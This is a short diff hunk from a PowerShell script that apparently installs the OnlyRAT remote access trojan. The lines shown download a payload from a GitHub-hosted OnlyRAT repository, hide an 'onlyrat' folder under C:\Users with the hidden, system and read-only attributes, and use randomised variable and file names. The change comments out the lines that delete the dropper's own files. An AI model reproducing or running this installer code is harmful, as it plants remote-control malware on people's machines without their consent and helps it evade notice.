@@ -60,6 +60,6 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloa
 Set-Location C:\Users
 attrib +h +s +r onlyrat 
 Set-Location $NyZnoLKCIs
-Remove-Item $CRYnrkaDbe
-Remove-Item lawFvVTikZ.txt
-Remove-Item KFPGaEYdcz.ps1
+# Remove-Item $CRYnrkaDbe
+# Remove-Item lawFvVTikZ.txt
+# Remove-Item KFPGaEYdcz.ps1
